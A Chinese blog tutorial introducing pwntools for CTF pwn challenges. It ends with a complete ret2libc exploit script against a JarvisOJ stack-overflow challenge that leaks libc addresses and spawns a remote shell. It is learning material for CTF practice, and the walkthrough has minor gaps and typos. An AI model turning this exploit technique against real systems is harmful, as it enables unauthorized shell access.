写在前面：

   说起来ctf中的pwn，我的心中可是五味杂陈。因为经历过被pwn题支配的恐惧。要做这一类型的题目，对于大多数人来说工具都是不可缺少的，当然，对于另外一小部分人来说工具仍然可以简化过程，下面介绍一下工具及其使用方法。

0x1 工具：pwntools

     官方介绍：pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.

    安装命令：

    Ubuntu：apt install python-pip

    目前来讲pwntools应该算是最好用的pwn工具了，下面介绍一下简单操作：

1、常用：

context.arch = 'amd64' ：设置架构为64位
context.log_level = 'debug' ：显示log详细信息

2、连接方法：本地运行process("./pwn1");远程连接remote("IP",port)

3、数据处理：p32()和u32()分别对应打包为二进制和解包为二进制（32位）。相应的还有p64()和u64()对应64位机的打包和解包。

4、IO操作：racv()、recvline()、recvuntil()均可接收程序运行时输出的信息，但又有不同,send()和sendline()均可用来向程序输入数据，它们的具体用法如下：

recv(numb=4096, timeout=default) : 参数一指定字节数,参数二指定超时
recvuntil(str, drop=False) : 接收到指定str,后面信息丢弃
recvline(keepends=True) : 接收到\n，keepends指定保留\n
recvall() : 接收到EOF
recvrepeat(timeout=default) : 接收到EOF或timeout

send(data): 发送数据 sendline(data) : 发送一行数据，相当于在末尾加\n

5、ELF模块：分析程序，获取基地址、获取函数地址、获取函数got地址、获取函数plt地址，具体用法：

e=ELF('./pwn1')
e.address : 文件装载的基地址
e.symbols['system'] : system函数地址
e.plt['write'] : write函数的plt地址
e.got['read'] ：read函数的got地址

6、其他工具：

file: 查看文件类型 checksec：检测程序使用的防护技术
cyclic：构造指定长度的字符串

    很轻松便能找到上面的函数，很显然程序存在栈溢出漏洞，定义的buf数组大小为0x88长度，read函数却能向buf数组写入0x100长度的数据。由于开启了栈内不可执行，所以无法通过向栈中注入shellcode达到目的，所以用IDA查看一下这个程序的字符串、导入表、导出表看是否存在"/bin/sh"、system函数以及调用system函数的函数。经过一番查找没有发现上述字符串和函数，但是看到导入表中存在read函数和write函数，因此，可以通过控制write函数将read函数的真实地址输出，然后利用公式：

system真实地址=read真实地址-read在libc中的地址+system在libc中的地址

    可以求出system函数在内存中的地址以及"/bin/sh"在内存中的地址，然后可以得到payload，exp如下：

from pwn import *

p=remote("pwn2.jarvisoj.com",9879)

p.recvline()

ep=ELF("./level3") ed=ELF("./libc-2.19.so")

write_addr=ep.plt["write"] read_addr=ep.got["read"] func_addr=0x0804844B

payload=0x88*'a'+p32(1) payload+=p32(write_addr) payload+=p32(func_addr) payload+=p32(0x01) payload+=p32(read_addr) payload+=p32(0x04)

p.sendline(payload) realr_addr=u32(p.recv(4))

reals_addr=realr_addr-ed.symbols['read']+ed.symbols['system'] sh_addr=realr_addr-ed.symbols['read']+ed.search("/bin/sh").next()

payload1=0x88*'a'+p32(2)+p32(reals_addr)+p32(3)+p32(sh_addr)

p.sendline(payload1)

p.interactive() `
